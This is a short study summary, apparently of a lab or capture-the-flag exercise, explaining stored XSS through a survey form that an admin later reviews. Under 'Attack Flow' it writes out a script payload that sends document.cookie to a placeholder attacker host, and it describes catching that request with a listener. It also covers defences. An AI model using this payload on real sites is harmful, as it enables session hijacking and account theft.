
**Summary – Stored XSS via User Input & Admin Review Panel**

- **Core Idea**: Stored cross‑site scripting (XSS) occurs when a web app accepts user‑generated content (e.g., surveys) and later displays it to another user (often an admin) without sanitizing or encoding the input.

- **Discovery Steps**
  1. **Enumeration** – Even if port scans show little, use directory brute‑forcing to locate hidden pages such as `/admin`, `/login`, `/survey`, etc.
  2. **Identify Trust Boundary** – A hint like “Real humans read your personality survey” signals that user input is stored and later read by an admin, creating a classic XSS attack surface.

- **Attack Flow**
  1. **Inject malicious JavaScript** into a form field, e.g.:
     ```html
     <script>
       fetch('http://ATTACKER-IP:PORT/?c=' + document.cookie)
     </script>
     ```
  2. **Set up a listener** (simple HTTP server) on the attacker machine to capture the request.
  3. When the admin views the stored content, the script runs, exfiltrating the admin’s cookies and enabling session hijacking.

- **Why It Works**
  - Input is stored unchanged in the backend.
  - The application renders it without output encoding.
  - JavaScript executes in the admin’s browser, exposing `document.cookie`.

- **Key Security Concepts**
  - **Stored XSS vs. Reflected XSS**: Stored XSS triggers later when another user views the content, whereas reflected XSS fires immediately after injection.
  - **Impact**: Session hijacking, unauthorized actions, data exfiltration, and potential privilege escalation.

- **Defensive Measures**
  - Apply strict input validation and output encoding.
  - Use HttpOnly cookies and enforce a Content Security Policy (CSP).
  - Avoid rendering raw user‑controlled HTML.

- **Practical Takeaway**
  - Whenever a form stores data that is later read by a higher‑privilege role (e.g., admin review panel), test for stored XSS.
  - Effective exploitation often comes from understanding application hints, user roles, and trust boundaries rather than extensive scanning.
